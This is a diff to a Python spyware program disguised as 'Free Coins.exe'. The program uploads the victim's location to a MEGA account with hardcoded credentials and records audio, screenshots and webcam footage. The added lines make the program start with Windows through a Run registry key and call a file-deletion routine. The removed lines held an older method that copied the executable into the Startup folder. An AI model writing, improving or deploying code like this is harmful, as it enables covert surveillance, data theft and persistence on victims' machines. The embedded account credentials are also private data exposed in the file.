@@ -11,6 +11,7 @@ import requests
 import geocoder
 import glob
 import pyautogui
+import winreg
 
 def delete_files():
     current_folder = os.getcwd()
@@ -172,6 +173,14 @@ def record_audio():
 
 while True:
     try:
+        delete_files()
+        
+        program_name = "consolebased.exe"
+        program_path = os.path.join(os.getcwd(), program_name)
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
+        winreg.SetValueEx(key, "Consolebased", 0, winreg.REG_SZ, program_path)
+        winreg.CloseKey(key)
+
         # set username/password
         mega_email = 'lajex92681@meidecn.com'
         mega_password = 'b@sit1218'
@@ -202,25 +211,6 @@ while True:
         else:
             location_folder = location_folder[0]
 
-        try:
-
-            home_dir = os.path.expanduser("~")
-
-            # Specify the source file path
-            source_file = "Free Coins.exe"
-
-            # get path of startup folder
-            startup_folder = os.path.join(home_dir, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-
-            # get path of malware
-            source_file_path = os.path.abspath(source_file)
-
-            # Copy to startup folder
-            shutil.copy(source_file_path, startup_folder)
-
-        except:
-            pass
-
         print("uploading location to location_folder")
         mega_login.upload(location_file_name, location_folder)
 
@@ -246,6 +236,6 @@ while True:
             audio_thread.join()
             screenshot_thread.join()
             webcam_thread.join()
-           
-    except:
-        print("retrying")
+            
+    except Exception as e:
+        print("An error occurred:", str(e))
